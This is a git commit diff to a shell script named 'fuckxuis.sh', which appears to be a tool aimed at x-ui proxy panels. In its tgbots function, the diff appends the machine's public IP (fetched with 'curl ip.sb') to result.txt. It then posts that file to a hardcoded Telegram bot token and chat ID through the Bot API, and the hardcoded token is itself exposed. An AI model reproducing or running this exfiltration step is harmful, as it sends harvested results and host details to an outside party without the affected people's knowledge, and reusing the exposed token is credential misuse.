c8976681feb46b554904707fd729ec4ff78b61d6
Aries <96482448+AriesEDGE@users.noreply.github.com>
2023-06-07 10:55:17 +0800

    Update fuckxuis.sh

--- fuckxuis.sh
+++ fuckxuis.sh
@@ -17,13 +17,13 @@ cvv(){
 }
 
 tgbots(){
+    echo "这台机器的IP是`curl ip.sb`" >> result.txt
     TOKEN=5677739231:AAG6zUBUJg2AQL9lxplHQBba1V5dNnVZnq4	#TG机器人token
     chat_ID=5770708575		#用户ID或频道、群ID
     message_text=`cat result.txt`		#要发送的信息
     MODE='HTML'		#解析模式，可选HTML或Markdown
     URL="https://api.telegram.org/bot${TOKEN}/sendMessage"		#api接口
     curl -s -X POST $URL -d chat_id=${chat_ID}  -d parse_mode=${MODE} -d text="${message_text}"  >> /dev/null
-    echo "这台机器的IP是`curl ip.sb`"
 }
 upd
 pyzt
